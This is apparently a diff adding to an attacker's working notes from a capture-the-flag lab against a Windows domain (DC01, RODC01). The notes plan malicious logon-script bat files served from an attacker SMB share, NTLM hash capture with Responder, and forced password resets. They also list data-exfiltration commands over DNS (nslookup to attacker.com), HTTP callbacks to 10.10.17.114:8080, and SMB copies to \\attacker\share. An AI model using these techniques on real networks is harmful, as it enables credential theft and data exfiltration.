@@ -682,3 +682,219 @@ Upload it BEFORE the first toggle. ONE toggle fires it. Done.
 
 ### But we already used 2 triggers on .18.14
 Need ANOTHER fresh instance. This time: ONE bat, ONE toggle.
+
+## 10:18 — Systematic Root Analysis
+
+### Three unknowns blocking root:
+
+1. **Does the bat trigger have a fire limit, or do our commands just fail?**
+   Evidence: 3 instances showed triggers stopping after 2-3 fires.
+   But: we never tested with a SIMPLE bat after the "exhaustion" point.
+   The complex bats (Invoke-Command) might hang, making it LOOK like the trigger stopped.
+
+2. **Does Invoke-Command from l.wilson's bat context to RODC01 work?**
+   Evidence: ic_debug.txt was created by icdebug.bat → bat fired.
+   But: we can't read ic_debug.txt to see if Invoke-Command succeeded or errored.
+   The file EXISTS — the answer is IN that file.
+
+3. **Where is root.txt?**
+   - NOT on DC01 (confirmed: where /r C:\ root.txt returned nothing)
+   - Probably on RODC01 (Administrator profile there, msDS-RevealedUsers has Admin)
+   - But: we can't confirm because we can't reach RODC01
+
+### What we need to test (in order):
+
+A. Can we read ic_debug.txt? (has the Invoke-Command result)
+   → Try: simple bat that copies ic_debug.txt to \\attacker\share
+   → If trigger is "exhausted": try waiting 5+ minutes between toggles
+   → If trigger truly dead: need fresh instance
+
+B. If we get a fresh instance, use ONE bat that does:
+   1. hostname > C:\Users\Public\proof.txt (proves bat ran + can write to Public)
+   2. Invoke-Command with Start-Job timeout → result to C:\Users\Public\ic_result.txt  
+   3. icacls C:\Users\Public\ic_result.txt /grant Everyone:R
+   4. copy C:\Users\Public\ic_result.txt \\attacker\share\result.txt
+   5. Set-ADAccountPassword l.wilson_adm (so we can read Public files via WinRM)
+
+   Then toggle ONCE. Check \\attacker\share first, C:\Users\Public second.
+
+C. If Invoke-Command doesn't work from bat context either:
+   → Root flag is unreachable via this path
+   → Need completely different approach (maybe the RBCD S4U ticket can be used differently)
+
+### NEW THEORY: bat process still running blocks next trigger
+combo.bat line 2 (Invoke-Command) may HANG indefinitely.
+While that process is alive, the logon simulation won't start a new bat.
+This isn't "trigger exhausted" — it's "previous bat still running."
+
+If true: we need bats that ALWAYS exit quickly. Use Start-Process or 
+Start-Job with strict timeouts. The icdebug.bat used Start-Job -Timeout 10
+which SHOULD have exited... but maybe the bat's cmd.exe process is still 
+waiting for the PowerShell subprocess.
+
+Test: check if there's a hanging powershell/cmd process on DC01 from l.wilson.
+
+### Hanging process theory: DISPROVEN
+tasklist shows no powershell/cmd processes from l.wilson.
+Previous bat processes exited cleanly. The trigger genuinely stops firing.
+
+### Back to task #2: test with simple bat
+
+### CRITICAL CORRECTION: Trigger is NOT exhausted
+simplebat.bat fired on 3rd+ toggle. trigger_test.txt EXISTS (access denied).
+The trigger fires EVERY time. We just can't read the output.
+
+ALL previous "trigger exhausted" conclusions were WRONG.
+The bats ran, wrote files, but l.wilson_adm can't read l.wilson's files.
+The SMB callbacks failed because Invoke-Command hung, not because trigger stopped.
+
+### The real problem: how to get output from l.wilson's bat to somewhere we can read
+- C:\Users\Public — access denied (l.wilson_adm can't read l.wilson's files)
+- C:\Windows\Temp — access denied (same)
+- SYSVOL — l.wilson can't write there
+- \\attacker\share — only works if bat commands don't hang (Invoke-Command hangs)
+
+### The answer: the SMB callback approach WORKS for non-hanging commands
+Earlier: dir \\attacker\share triggered hash capture (confirmed on first instance).
+The SMB copy failed because it was AFTER Invoke-Command which hangs.
+If we put the SMB callback BEFORE Invoke-Command, it will fire.
+Or: use timeout/Start-Process /B to run Invoke-Command in background.
+
+### 10:29 — SMB callback from bat DOES NOT WORK on .18.14
+smbtest.bat created smb_test.txt (bat ran) but dir \\10.10.17.114\share 
+produced NO connection to our smbserver.
+
+This worked on the FIRST instance (.178) where we captured l.wilson's hash.
+But on .18.14 it doesn't connect. Possible reasons:
+- Firewall/policy changed on newer instances
+- Our smbserver is listening on 0.0.0.0 but DC outbound to port 445 is blocked
+- The logon script context restricts outbound SMB (but earlier hash capture worked)
+
+### Wait — the hash capture was via RESPONDER not smbserver
+Responder listens differently. And the scriptPath was \\10.10.17.114\share\x.bat
+(the bat FILE was on our share, not a copy TO our share).
+When Windows resolves the scriptPath UNC, it does NTLM auth to our server.
+That's different from the bat running `dir \\attacker\share`.
+
+### The UNC scriptPath approach is the answer:
+Set scriptPath = \\10.10.17.114\share\root_exfil.bat
+Windows will FETCH the bat from our SMB server, executing it locally.
+We serve the bat via smbserver. The bat runs on DC01 as l.wilson.
+No outbound SMB from inside the bat needed — the bat IS the share.
+
+## 10:30 — Brainstorm: bat fires, can't read output
+
+### What the bat CAN do (confirmed):
+- Run PowerShell commands as l.wilson
+- Write files to C:\Windows\Temp and C:\Users\Public
+- Change AD passwords (Set-ADAccountPassword)
+- Run Invoke-Command (unknown if it succeeds to RODC01)
+
+### What we CAN'T do:
+- Read files l.wilson creates (l.wilson_adm gets access denied)
+- Get SMB callbacks from inside bat (outbound SMB blocked from bat context)
+- Write to SYSVOL from bat
+
+### Ways to get data OUT from the bat without reading files:
+
+1. **DNS exfil**: bat runs `nslookup <flag>.attacker.com` — we see the query
+   → powershell -c "$f = Invoke-Command ...; nslookup $f.attacker.com"
+   → Monitor with tcpdump on tun0
+
+2. **ICMP exfil**: bat runs `ping -n 1 <encoded_flag>.attacker.com`
+   → Same as DNS but via ping
+
+3. **HTTP callback**: bat runs `Invoke-WebRequest http://10.10.17.114:8080/$flag`
+   → Start python http server on port 8080
+   → Flag appears in URL of incoming request
+
+4. **Change a password TO the flag value**: 
+   Set-ADAccountPassword -Identity FAKEPC$ -Reset -NewPassword (flag_value)
+   → Then we crack/read FAKEPC$'s new password
+   → Actually: we can't read the password back easily
+
+5. **Write flag as an AD attribute we CAN read**:
+   Set l.wilson's description or info field to the flag value
+   → We can read it via LDAP as j.arbuckle
+   → powershell -c "$f = Invoke-Command ...; Set-ADUser l.wilson -Description $f"
+   → Then: ldapsearch for l.wilson description
+
+6. **Write to a DNS TXT record**:
+   → Create a DNS record with the flag as value
+   → Read it from outside
+
+### WINNER: #5 — Write flag to AD attribute
+- Bat runs Invoke-Command, gets flag, sets l.wilson's Description to flag
+- We read Description via ldapsearch as j.arbuckle
+- l.wilson CAN modify her own description (users can edit some own attributes)
+- Or use Set-ADUser on another user we control
+
+### ALSO GOOD: #3 — HTTP callback
+- Bat runs: powershell IWR http://10.10.17.114:8080/$flag
+- We run python3 -m http.server 8080
+- Flag appears in HTTP access log
+- Simpler than AD attribute, doesn't depend on AD write perms
+
+## 10:33 — Invoke-Command to RODC01: RETURNS EMPTY (NOFLAG)
+
+HTTP exfil confirms: Invoke-Command Start-Job completed within 15s 
+but Receive-Job returned nothing. The command isn't HANGING — it 
+completes but produces no output.
+
+### Next: debug WHY Invoke-Command returns empty
+Need to capture the ERROR, not just the result.
+Try: Invoke-Command with -ErrorVariable and exfil the error message.
+
+## 10:34 — Invoke-Command to RODC01 definitively fails
+
+### Evidence:
+- Start-Job + 15s timeout: NOFLAG (returns empty, job completes)
+- Direct Invoke-Command with try/catch: NO callback (hangs, never reaches catch)
+- Conclusion: RODC01 WinRM rejects l.wilson or hangs on auth negotiation
+
+### Invoke-Command is NOT the path to root.
+
+### Remaining options to reach RODC01:
+1. SMB (net use \\192.168.100.2\C$) — l.wilson auth works but C$ access denied
+   What about other shares? IPC$? SYSVOL?
+   
+2. RDP to RODC01 — port 3389 may be open, l.wilson is in Remote Desktop Users
+
+3. WMI to RODC01 — different protocol than WinRM
+
+4. Maybe root.txt ISN'T on RODC01 — maybe we need to actually become
+   Administrator on DC01 to create the profile and the flag appears
+
+### Wait — RDP!
+l.wilson is in Remote Desktop Users. If RODC01 has RDP open (port 3389),
+l.wilson could RDP in. But from a bat context we can't RDP interactively.
+However: we can use cmdkey + mstsc, or use xfreerdp from inside the bat...
+no, that doesn't make sense.
+
+### Actually: net use \\192.168.100.2\IPC$ 
+IPC$ is usually accessible to all authenticated users.
+From IPC$ we can enumerate shares, or use psexec-style techniques.
+
+## 10:38 — l.wilson bat CANNOT access RODC01 at all
+
+### Confirmed via HTTP exfil:
+- Invoke-Command to RODC01: NOFLAG (empty/timeout)
+- Direct UNC type \\192.168.100.2\C$\root.txt: HANGS (no callback)
+- Any access to RODC01 from bat context hangs
+
+### Root flag is NOT accessible via RODC01 from DC01
+
+### RETHINKING: maybe root.txt IS on DC01
+We searched with `where /r C:\ root.txt` and found nothing.
+But that search runs as l.wilson_adm who has limited access.
+What if root.txt is in a location only Administrator can see?
+Like C:\Users\Administrator\ which doesn't exist because Admin hasn't logged in.
+
+### The intended path might be:
+1. Actually become Administrator (not just read the flag)
+2. The RBCD chain gives us an Administrator ticket for RODC01$ service
+3. Maybe we need to use that ticket differently
+
+### Or: maybe we haven't tried the right approach to BECOME admin on DC01
+We have WriteAccountRestrictions on RODC01$. We used it for RBCD.
+What ELSE does WriteAccountRestrictions let us do?
